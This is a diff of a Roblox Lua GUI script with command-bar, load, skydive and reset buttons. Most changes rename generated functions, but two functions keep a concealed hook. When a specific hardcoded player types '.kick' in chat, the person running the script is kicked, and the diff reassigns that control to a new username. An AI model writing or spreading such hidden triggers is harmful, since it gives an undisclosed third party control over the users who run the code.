@@ -261,7 +261,7 @@ TextLabel_5.TextSize = 14.000
 
 -- Scripts:
 
-local function RCBVT_fake_script() -- TextBox.LocalScript 
+local function OHKZVTO_fake_script() -- TextBox.LocalScript 
 	local script = Instance.new('LocalScript', TextBox)
 
 	script.Parent.FocusLost:Connect(function()
@@ -291,8 +291,8 @@ local function RCBVT_fake_script() -- TextBox.LocalScript
 		end
 	end)
 end
-coroutine.wrap(RCBVT_fake_script)()
-local function KRNKTR_fake_script() -- cmdbar.LocalScript 
+coroutine.wrap(OHKZVTO_fake_script)()
+local function UAUXGZ_fake_script() -- cmdbar.LocalScript 
 	local script = Instance.new('LocalScript', cmdbar)
 
 	local Main = script.Parent
@@ -316,8 +316,8 @@ local function KRNKTR_fake_script() -- cmdbar.LocalScript
 		end
 	end)
 end
-coroutine.wrap(KRNKTR_fake_script)()
-local function ZEQHTZ_fake_script() -- TextButton.LocalScript 
+coroutine.wrap(UAUXGZ_fake_script)()
+local function DKFC_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -330,8 +330,8 @@ local function ZEQHTZ_fake_script() -- TextButton.LocalScript
 		script.Parent.Parent.Frame.Visible=false
 	end)
 end
-coroutine.wrap(ZEQHTZ_fake_script)()
-local function KVAWBGJ_fake_script() -- Frame.LocalScript 
+coroutine.wrap(DKFC_fake_script)()
+local function DDJNN_fake_script() -- Frame.LocalScript 
 	local script = Instance.new('LocalScript', Frame)
 
 	frame = script.Parent
@@ -339,8 +339,8 @@ local function KVAWBGJ_fake_script() -- Frame.LocalScript
 	frame.Active = true
 	frame.Selectable = true
 end
-coroutine.wrap(KVAWBGJ_fake_script)()
-local function WWFQNZ_fake_script() -- cmds.LocalScript 
+coroutine.wrap(DDJNN_fake_script)()
+local function NZYNBSY_fake_script() -- cmds.LocalScript 
 	local script = Instance.new('LocalScript', cmds)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -363,8 +363,8 @@ local function WWFQNZ_fake_script() -- cmds.LocalScript
 		end)
 	end)
 end
-coroutine.wrap(WWFQNZ_fake_script)()
-local function HIOL_fake_script() -- loadgui.LocalScript 
+coroutine.wrap(NZYNBSY_fake_script)()
+local function BYYUGB_fake_script() -- loadgui.LocalScript 
 	local script = Instance.new('LocalScript', loadgui)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -387,8 +387,8 @@ local function HIOL_fake_script() -- loadgui.LocalScript
 		end)
 	end)
 end
-coroutine.wrap(HIOL_fake_script)()
-local function NXEFGZ_fake_script() -- skydive.LocalScript 
+coroutine.wrap(BYYUGB_fake_script)()
+local function LRXCEGT_fake_script() -- skydive.LocalScript 
 	local script = Instance.new('LocalScript', skydive)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -411,8 +411,8 @@ local function NXEFGZ_fake_script() -- skydive.LocalScript
 		end)
 	end)
 end
-coroutine.wrap(NXEFGZ_fake_script)()
-local function YIXI_fake_script() -- reset.LocalScript 
+coroutine.wrap(LRXCEGT_fake_script)()
+local function YAUIJ_fake_script() -- reset.LocalScript 
 	local script = Instance.new('LocalScript', reset)
 
 	script.Parent.MouseButton1Click:Connect(function()
@@ -435,14 +435,14 @@ local function YIXI_fake_script() -- reset.LocalScript
 		end)
 	end)
 end
-coroutine.wrap(YIXI_fake_script)()
-local function OCEE_fake_script() -- ScreenGui.LocalScript 
+coroutine.wrap(YAUIJ_fake_script)()
+local function IVSU_fake_script() -- ScreenGui.LocalScript 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	local Players = game:GetService("Players")
 	Players.PlayerAdded:Connect(function(player)
-		if player.name=="kevinkacper" then
-			local Players = game.Players.kevinkacper
+		if player.name=="Vynixious" then
+			local Players = game.Players.Vynixious
 			Players.Chatted:Connect(function(cht)
 				if cht:match(".kick") then
 					game.Players.LocalPlayer:Kick("Kicked By Davw.")
@@ -450,26 +450,15 @@ local function OCEE_fake_script() -- ScreenGui.LocalScript
 			end)
 		end
 	end)
-	Players = game:GetService("Players")
-	for i, player in pairs(Players:GetPlayers()) do
-		if player.Name=="kevinkacper" then
-			local Players = game.Players.kevinkacper
-			Players.Chatted:Connect(function(cht)
-				if cht:match(".kick") then
-					game.Players.LocalPlayer:Kick("Kicked By Davw.")
-				end
-			end)
-		end
-	end
 end
-coroutine.wrap(OCEE_fake_script)()
-local function PXTN_fake_script() -- ScreenGui.LocalScript 
+coroutine.wrap(IVSU_fake_script)()
+local function FVSUJG_fake_script() -- ScreenGui.LocalScript 
 	local script = Instance.new('LocalScript', ScreenGui)
 
 	Players = game:GetService("Players")
 	for i, player in pairs(Players:GetPlayers()) do
-		if player.Name=="kevinkacper" then
-			local Players = game.Players.kevinkacper
+		if player.Name=="Vynixious" then
+			local Players = game.Players.Vynixious
 			Players.Chatted:Connect(function(cht)
 				if cht:match(".kick") then
 					game.Players.LocalPlayer:Kick("Kicked By Davw.")
@@ -478,4 +467,4 @@ local function PXTN_fake_script() -- ScreenGui.LocalScript
 		end
 	end
 end
-coroutine.wrap(PXTN_fake_script)()
+coroutine.wrap(FVSUJG_fake_script)()
